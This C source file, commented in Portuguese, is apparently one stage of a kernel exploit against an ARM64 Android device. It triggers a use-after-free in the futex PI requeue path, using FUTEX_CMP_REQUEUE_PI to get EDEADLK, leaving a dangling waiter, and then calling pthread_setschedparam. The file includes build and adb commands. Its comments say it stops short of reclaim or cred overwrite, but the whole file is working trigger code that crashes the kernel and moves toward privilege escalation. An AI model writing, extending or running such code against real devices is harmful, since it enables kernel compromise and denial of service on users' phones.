/*
 * ghostlock_uaf_isolate.c — isola QUAL consumer derruba o device.
 *
 * Achado que motivou esta tool: ghostlock_uaf_check.c (Fase 3) derruba o
 * aquaman na perna VULN, mas o log para em "[vuln] cmp_errno=35" — ou seja,
 * o crash vem DEPOIS do rollback, na perna de teardown/consumidor, e nao
 * durante o CMP. E o device volta sozinho (PANIC_TIMEOUT=1), entao cada
 * teste custa um reboot, nao um power cycle.
 *
 * Quatro pernas, uma por execucao (argv[1] = 1..4), para nao misturar
 * estado. Todas montam o mesmo trio PI; o que muda e o consumer:
 *
 *   1 control   sem CMP (waiter sai por timeout), sem consumer
 *   2 vuln      CMP -> EDEADLK, sem consumer
 *   3 vuln+sched  CMP -> EDEADLK, consumer = pthread_setschedparam
 *   4 vuln+spin   CMP -> EDEADLK, consumer = nada, so espera o waiter sair
 *
 * Interpretacao:
 *   1 e 2 verdes + 3 vermelho  => o consumer e o gatilho. O walk em
 *        rt_mutex_setprio/rt_mutex_get_effective_prio desce pelo
 *        pi_blocked_on pendurado e o frame ja foi reocupado: e o UAF.
 *   2 vermelho                 => o proprio wake do waiter (rt_mutex_wake
 *        sobre a waiters tree com nodo pendurado) e o gatilho, e nao ha
 *        consumer utilizavel para calibracao.
 *   1 vermelho                 => a tool esta errada, nao o kernel.
 *
 * Sem reclaim, sem carimbo, sem escrita em cred/funcptr, sem SELinux.
 * Nada persiste. Risco: reboot por teste, ja conhecido.
 *
 * Build (NDK r29, ARM64, API 28):
 *   ~/Android/Sdk/ndk/29.0.14206865/toolchains/llvm/prebuilt/linux-x86_64/bin/\
 *     aarch64-linux-android28-clang -O2 -Wall -static \
 *     ghostlock_uaf_isolate.c -o ghostlock_uaf_isolate
 * Run:
 *   adb push ghostlock_uaf_isolate /data/local/tmp/
 *   adb shell /data/local/tmp/ghostlock_uaf_isolate 3
 */
#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#ifndef __NR_futex
#define __NR_futex 98
#endif
#define FUTEX_LOCK_PI            6
#define FUTEX_UNLOCK_PI          7
#define FUTEX_WAIT_REQUEUE_PI    11
#define FUTEX_CMP_REQUEUE_PI     12
#define FUTEX_PRIVATE_FLAG       128
#define EDEADLK                  35

#define FLPI (FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG)
#define FUPI (FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG)
#define FWRQ (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
#define FCRQ (FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG)

static uint32_t f_wait, f_target, f_chain;
static volatile int w_ready, w_waiting, w_done, o_started;
static volatile int consumer_mode;   /* 0 = sem consumer */
static pthread_t waiter_tid;

static long xfutex(void *u1, int op, uint32_t val, void *to, void *u2,
                   uint32_t v3) {
    return syscall(__NR_futex, u1, op, val, to, u2, v3);
}

static uint64_t now_ns(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}

static void *waiter_fn(void *u) {
    (void)u;
    if (xfutex(&f_chain, FLPI, 0, NULL, NULL, 0))
        return NULL;
    w_ready = 1;
    while (!o_started)
        usleep(1000);
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 1;
    w_waiting = 1;
    xfutex(&f_wait, FWRQ, 0, &ts, &f_target, 0);
    xfutex(&f_chain, FUPI, 0, NULL, NULL, 0);
    w_done = 1;
    printf("[waiter] saiu do wait (waiter=%s)\n",
           consumer_mode ? "vai receber consumer" : "sem consumer");
    /* fica vivo e paradoxal: o frame de kernel ja foi liberado */
    sleep(60);
    return NULL;
}

static void *owner_fn(void *u) {
    (void)u;
    if (xfutex(&f_target, FLPI, 0, NULL, NULL, 0))
        return NULL;
    while (!w_ready)
        usleep(1000);
    o_started = 1;
    xfutex(&f_chain, FLPI, 0, NULL, NULL, 0);
    printf("[owner] saiu do lock\n");
    return NULL;
}

int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    int leg = argc > 1 ? atoi(argv[1]) : 3;
    int with_cmp = (leg >= 2);
    consumer_mode = (leg == 3);

    printf("[info] leg=%d (%s) with_cmp=%d consumer=%d\n", leg,
           leg == 1 ? "control" : leg == 2 ? "vuln sem consumer"
           : leg == 3 ? "vuln + setschedparam" : "vuln + espera",
           with_cmp, consumer_mode);

    f_wait = f_target = f_chain = 0;
    w_ready = w_waiting = w_done = o_started = 0;

    pthread_t w, o;
    if (pthread_create(&w, NULL, waiter_fn, NULL)) {
        printf("[FAIL] pthread_create waiter\n");
        return 1;
    }
    waiter_tid = w;
    if (pthread_create(&o, NULL, owner_fn, NULL)) {
        printf("[FAIL] pthread_create owner\n");
        return 1;
    }
    while (!w_waiting || !o_started)
        usleep(1000);

    if (with_cmp) {
        usleep(200000);
        errno = 0;
        xfutex(&f_wait, FCRQ, 1, (void *)(uintptr_t)1, &f_target, 0);
        int e = errno;
        printf("[cmp] errno=%d (%s)\n", e, strerror(e));
        if (e != EDEADLK) {
            printf("[verdict] rollback NAO atingido, aborta\n");
            return 3;
        }
    } else {
        printf("[cmp] pulado (controle)\n");
        usleep(1300000);
    }

    xfutex(&f_target, FUPI, 0, NULL, NULL, 0);
    pthread_join(o, NULL);

    int spins = 0;
    while (!w_done && spins++ < 250) {
        usleep(20000);
        printf("[wait] w_done=0, %d\n", spins);
    }
    printf("[wait] w_done=%d apos %d spins\n", w_done, spins);
    if (!w_done) {
        printf("[verdict] waiter nao voltou\n");
        return 2;
    }

    if (consumer_mode) {
        struct sched_param p = { .sched_priority = 0 };
        printf("[consumer] antes do setschedparam\n");
        uint64_t t0 = now_ns();
        errno = 0;
        int r = pthread_setschedparam(waiter_tid, SCHED_BATCH, &p);
        printf("[consumer] BATCH ret=%d errno=%d(%s) %lluns\n", r, errno,
               r ? strerror(errno) : "ok",
               (unsigned long long)(now_ns() - t0));
        printf("[consumer] antes do SCHED_OTHER\n");
        t0 = now_ns();
        errno = 0;
        r = pthread_setschedparam(waiter_tid, SCHED_OTHER, &p);
        printf("[consumer] OTHER ret=%d errno=%d(%s) %lluns\n", r, errno,
               r ? strerror(errno) : "ok",
               (unsigned long long)(now_ns() - t0));
    }

    printf("[verdict] leg=%d sobreviveu, consumer=%d\n", leg, consumer_mode);
    return 0;
}
